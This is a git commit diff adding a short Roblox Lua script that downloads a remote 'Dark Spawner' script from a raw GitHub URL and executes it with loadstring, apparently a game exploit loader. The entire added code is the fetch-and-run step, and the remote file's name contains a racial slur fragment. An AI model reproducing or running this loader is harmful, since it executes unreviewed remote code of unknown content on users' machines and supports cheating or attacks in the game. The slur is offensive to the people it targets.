da7b9555c6441a87e40d77791781170a79ad051d
SleeeeeepyLMAO <127635441+SleeeeeepyLMAO@users.noreply.github.com>
2025-06-26 19:29:33 -0400

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,1 +1,12 @@
-https://privatebin.net/?a0a13578881eb962#5Jv8Y9Fvnc3i2SFRaEBLFXc7iZo2abaVYWVPZ8awy1zv
+local success, err = pcall(function()
+    local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/iwantsom3/script/refs/heads/main/Niggggfd.lua"))()
+    if Spawner and Spawner.Load then
+        Spawner.Load()
+    else
+        warn("Failed to load Dark Spawner")
+    end
+end)
+
+if not success then
+    warn("Error loading Dark Spawner:", err)
+end
